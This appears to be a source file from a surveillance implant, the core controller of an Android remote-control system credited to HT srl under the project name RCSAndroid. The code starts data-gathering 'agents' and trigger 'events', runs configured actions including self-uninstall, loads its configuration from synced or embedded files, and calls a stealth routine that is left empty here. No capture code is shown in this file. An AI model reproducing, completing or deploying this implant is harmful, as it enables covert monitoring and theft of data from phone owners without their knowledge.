/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.res.Resources;
import android.util.Log;

import com.ht.RCSAndroidGUI.action.Action;
import com.ht.RCSAndroidGUI.action.SubAction;
import com.ht.RCSAndroidGUI.action.UninstallAction;
import com.ht.RCSAndroidGUI.agent.AgentConf;
import com.ht.RCSAndroidGUI.agent.AgentManager;
import com.ht.RCSAndroidGUI.agent.AgentType;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.event.EventManager;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class CoreThread.
 */
public class Core extends Activity implements Runnable {

	/** The Constant SLEEPING_TIME. */
	private static final int SLEEPING_TIME = 1000;
	private static final String TAG = "Core";

	/** The b stop core. */
	private boolean bStopCore = false;

	/** The resources. */
	private Resources resources;

	/** The core thread. */
	private Thread coreThread;

	/** The content resolver. */
	private ContentResolver contentResolver;

	/** The agent manager. */
	private AgentManager agentManager;

	/** The event manager. */
	private EventManager eventManager;

	/**
	 * Start.
	 * 
	 * @param r
	 *            the r
	 * @param cr
	 *            the cr
	 * @return true, if successful
	 */
	public boolean Start(final Resources r, final ContentResolver cr) {
		coreThread = new Thread(this);
		agentManager = AgentManager.self();
		eventManager = EventManager.self();

		resources = r;
		contentResolver = cr;

		Check.asserts(resources != null, "Null Resources");

		try {
			coreThread.start();
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return true;
	}

	/**
	 * Stop.
	 * 
	 * @return true, if successful
	 */
	public boolean Stop() {
		bStopCore = true;
		stopAll();
		Log.d("QZ", TAG + " RCS Thread Stopped");
		return true;
	}

	// Runnable (main routine for RCS)
	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		Log.d("QZ", TAG + " RCS Thread Started");

		stealth();
		
		try {
			while (!bStopCore) {
				Log.d("QZ", TAG + " Info: init task");

				if (taskInit() == false) {
					Log.d("QZ", TAG + " Error: TaskInit() FAILED");
					break;
				} else {
					Log.d("QZ", TAG + " TaskInit() OK");
					// CHECK: Status o init?
				}

				Status.self().setRestarting(false);
				Log.d("QZ", TAG + " Info: starting checking actions");

				if (checkActions() == Exit.RELOAD) {
					Log.d("QZ", TAG + " Info: Waiting a while before reloading");
					Utils.sleep(2000);
				} else {
					Log.d("QZ", TAG + " Error: CheckActions() wants to exit");
					// chiudere tutti i thread
					break;
				}
			}
			stopAll();
		} catch (final Exception ex) {
			Log.d("QZ", TAG + " Error: run " + ex);
		} finally {
			Log.d("QZ", TAG + " RCSAndroid exit ");
			Utils.sleep(2000);
			System.exit(0);
		}
	}

	private void stopAll() {
		Status status = Status.self();
		status.setRestarting(true);
		Log.d("QZ", TAG + " Warn: " + "checkActions: reloading");
		status.unTriggerAll();
		Log.d("QZ", TAG + " checkActions: stopping agents");
		agentManager.stopAll();
		Log.d("QZ", TAG + " checkActions: stopping events");
		eventManager.stopAll();
		Utils.sleep(2000);
		Log.d("QZ", TAG + " checkActions: untrigger all");
		status.unTriggerAll();

		final LogDispatcher logDispatcher = LogDispatcher.self();
		if (!logDispatcher.isAlive()) {
			logDispatcher.halt();
		}
	}

	/**
	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
	 * bloccante.
	 * 
	 * @return true, if successful
	 */
	private Exit checkActions() {
		final Status status = Status.self();

		try {
			while (!bStopCore) {
				Log.d("QZ", TAG + " checkActions");
				final int[] actionIds = status.getTriggeredActions();

				for (int actionId : actionIds) {
					final Action action = status.getAction(actionId);
					final Exit exitValue = executeAction(action);

					if (exitValue == Exit.UNINSTALL) {
						Log.d("QZ", TAG + " Info: checkActions: Uninstall");
						UninstallAction.actualExecute();

						return exitValue;
					} else if (exitValue == Exit.RELOAD) {
						Log.d("QZ", TAG + " checkActions: want Reload");

						return exitValue;
					}
				}
			}

			return Exit.STOP;
		} catch (final Throwable ex) {
			// catching trowable should break the debugger ans log the full
			// stack trace
			Log.d("QZ", TAG + " FATAL: checkActions error, restart: " + ex);

			return Exit.ERROR;
		}
	}

	/**
	 * Inizializza il core.
	 * 
	 * @return false if any fatal error
	 */
	private boolean taskInit() {
		try {
			Path.makeDirs();

			// Identify the device uniquely
			final Device device = Device.self();

			if (!loadConf()) {
				Log.d("QZ", TAG + " Error: Cannot load conf");
				return false;
			}

			// Start log dispatcher
			final LogDispatcher logDispatcher = LogDispatcher.self();
			if (!logDispatcher.isAlive()) {
				logDispatcher.start();
			}

			// Da qui in poi inizia la concorrenza dei thread

			if (eventManager.startAll() == false) {
				Log.d("QZ", TAG + " eventManager FAILED");
				return false;
			}

			Log.d("QZ", TAG + " Info: Events started");

			if (agentManager.startAll() == false) {
				Log.d("QZ", TAG + " agentManager FAILED");
				return false;
			}
		
			Log.d("QZ", TAG + " Info: Agents started");
			Log.d("QZ", TAG + " Core initialized");
			return true;

		} catch (final RCSException rcse) {
			rcse.printStackTrace();
			Log.d("QZ", TAG + " RCSException() detected");
		} catch (final Exception e) {
			e.printStackTrace();
			Log.d("QZ", TAG + " Exception() detected");
		}

		return false;

	}

	/**
	 * Tries to load the new configuration, if it fails it get the resource
	 * conf.
	 * 
	 * @return false if no correct conf available
	 * @throws RCSException
	 *             the rCS exception
	 */
	public boolean loadConf() throws RCSException {
		boolean loaded = false;

		// tries to load the file got from the sync, if any.
		final AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);

		if (file.exists()) {
			final byte[] resource = file.read(8);

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Load the configuration
			loaded = conf.LoadConfiguration();

			Log.d("QZ", TAG + " Info: Conf file loaded: " + loaded);

			if (!loaded) {
				file.delete();
			}
		}

		// tries to load the resource conf
		if (!loaded) {
			// Open conf from resources and load it into resource
			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 8); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Load the configuration
			loaded = conf.LoadConfiguration();

			Log.d("QZ", TAG + " Info: Resource file loaded: " + loaded);
		}

		return loaded;
	}

	/**
	 * Stealth.
	 */
	private void stealth() {
		// TODO Auto-generated method stub
	}

	/**
	 * Execute action.
	 * 
	 * @param action
	 *            the action
	 * @return the int
	 */
	private Exit executeAction(final Action action) {
		Exit exit = Exit.SUCCESS;

		Log.d("QZ", TAG + " CheckActions() triggered: " + action);
		final Status status = Status.self();
		status.unTriggerAction(action);

		status.synced = false;

		final int ssize = action.getSubActionsNum();
		Log.d("QZ", TAG + " checkActions, " + ssize + " subactions");

		int i = 1;
		for( SubAction subAction : action.getSubActions()){
			try {

				/*
				 * final boolean ret = subAction.execute(action
				 * .getTriggeringEvent());
				 */
				Log.d("QZ", TAG + " Info: (CheckActions) executing subaction (" + (i++) + "/" + ssize + ") : "
						+ action);

				subAction.prepareExecute();
				boolean ret = subAction.execute();

				if (subAction.wantUninstall()) {
					Log.d("QZ", TAG + " Warn: (CheckActions): uninstalling");
					exit = Exit.UNINSTALL;
					break;
					// return false;
				}

				if (subAction.wantReload()) {
					Log.d("QZ", TAG + " (CheckActions): reloading");
					stopAll();

					// return true;
					exit = Exit.RELOAD;
					break;
				}

				if (ret == false) {
					Log.d("QZ", TAG + " Warn: " + "CheckActions() error executing: " + subAction);
					continue;
				}
			} catch (final Exception ex) {
				Log.d("QZ", TAG + " Error: checkActions for: " + ex);
			}
		}

		return exit;
	}

}
